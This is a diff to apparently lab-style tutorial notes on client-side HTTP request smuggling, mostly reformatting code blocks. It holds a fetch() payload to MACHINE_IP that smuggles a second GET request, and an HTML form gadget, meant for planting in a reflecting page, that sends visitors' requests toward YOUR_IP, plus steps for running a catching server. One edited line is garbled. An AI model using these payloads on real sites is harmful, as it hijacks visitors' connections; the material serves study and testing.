@@ -12,7 +12,7 @@
 
 #### Straightforward payload example:
 
-fetch('http://MACHINE\_IP:5000/', { method: 'POST', body: 'GET /redirect HTTP/1.1\r\nFoo: x', mode: 'cors',})
+    fetch('http://MACHINE\_IP:5000/', { method: 'POST', body: 'GET /redirect HTTP/1.1\r\nFoo: x', mode: 'cors',})
 
 #### Write this JavaScript Payload in your browser command line that you can write JS
 
@@ -34,9 +34,9 @@ fetch('http://MACHINE\_IP:5000/', { method: 'POST', body: 'GET /redirect HTTP/1.
 
 #### We can use the following gadget and deliver it to abuse any component of the web application that allows to reflect text and probably be visited by a user:
 
-<>form id="btn" action="http://MACHINE\_NAME.COM/" method="POST" enctype="text/plain"> <>textarea name="GET http://YOUR\_IP HTTP/1.1 AAA: A">placeholder1 <>button type="submit">placeholder2
+    <form id="btn" action="http://MACHINE\_NAME.COM/" method="POST" enctype="text/plain"> <textarea name="GET http://YOUR\_IP HTTP/1.1 AAA: A">placeholder1 <button type="submit">placeholder2
 
-<> btn.submit()&#x20;
+    <btn.submit()&#x20;>
 
 #### We utilize a form because it inherently supports a keep-alive connection by default. The type is used to avoid the default encoding MIME type since we don't want to encode the second malicious request.
 
@@ -52,9 +52,13 @@ fetch('http://MACHINE\_IP:5000/', { method: 'POST', body: 'GET /redirect HTTP/1.
 
 **2) Type in the form included to the vulnerable part of the application**
 
-**3) sudo python3 smugglingserver.py**
+**3) 
 
-**4) sudo python3 -m http.server 8080**
+    sudo python3 smugglingserver.py**
+
+**4) 
+
+    sudo python3 -m http.server 8080**
 
 **5) Send the request**
 
